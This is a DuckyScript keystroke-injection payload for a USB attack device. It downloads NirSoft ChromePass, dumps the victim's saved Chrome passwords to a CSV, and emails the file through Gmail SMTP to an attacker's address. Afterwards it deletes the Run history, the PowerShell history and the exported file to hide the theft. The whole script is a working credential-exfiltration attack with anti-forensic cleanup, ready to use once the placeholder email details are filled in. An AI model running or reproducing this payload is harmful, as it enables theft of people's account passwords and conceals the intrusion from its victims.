REM Author: Mountain
REM: Title - Install Chromepass and send a copy of the csv to gmail account then cleanup
REM Date: 11/22/21
REM 
REM Change all instances of SENDEMAIL, SENDEMAIL PASSWORD, RECEIVEEMAIL
REM
REM - Download and start Chromepass
DELAY 3000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500
STRING Invoke-WebRequest -Uri 'https://www.nirsoft.net/toolsdownload/chromepass.zip' -OutFile 'C:\'
ENTER
STRING Expand-Archive C:\chromepass.zip
ENTER
DELAY 9000
STRING Start-Process C:\chromepass\chromepass.exe\
ENTER
REM - Save credentials to documents folder
DELAY 1000
CTRL+A
DELAY 100
CTRL+S
DELAY 500
STRING chromepasswords.csv
DELAY 100
TAB
TAB
TAB
TAB
TAB
TAB
ENTER
STRING C:\Users\%userprofile%\Documents\
ENTER
TAB
TAB
TAB
TAB
TAB
TAB
TAB
TAB
TAB
ENTER
REM - Send credentials to email
DELAY 500
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
DELAY 100
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
DELAY 100
STRING $SMTPInfo.EnableSSL = $true
ENTER
DELAY 100
REM - Enable less secure app access to sender's email: https://myaccount.google.com/lesssecureapps
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDEMAIL@gmail.com', 'SENDEMAIL PASSWORD')
ENTER
DELAY 100
STRING $SMTPServer = $E = New-Object System.Net.Mail.MailMessage
ENTER
DELAY 100
STRING $E.From = 'SENDEMAIL@gmail.com'
ENTER
DELAY 100
STRING $E.To.Add('RECEIVEEMAIL@gmail.com')
ENTER
DELAY 100
STRING $E.Subject = $env:UserName
ENTER
DELAY 100
STRING $E.Body = 'Chrome-Harvest'
ENTER
DELAY 100
STRING $F = 'Documents\chromepasswords.csv'
ENTER
DELAY 100
STRING $E.Attachments.Add($F)
ENTER
DELAY 100
STRING $F = $SMTPInfo.Send($E)
ENTER
DELAY 100
STRING exit
ENTER
REM - Clean up
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500
STRING Stop-Process -Name "Chromepass.exe"
ENTER
STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
ENTER
STRING cd AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
ENTER
STRING del ConsoleHost_history.txt
ENTER
STRING cd ..\..\..\..\..\..
ENTER
STRING cd Documents
ENTER
STRING del chromepasswords.csv
ENTER
STRING cd \
STRING del chromepass
STRING exit
ENTER
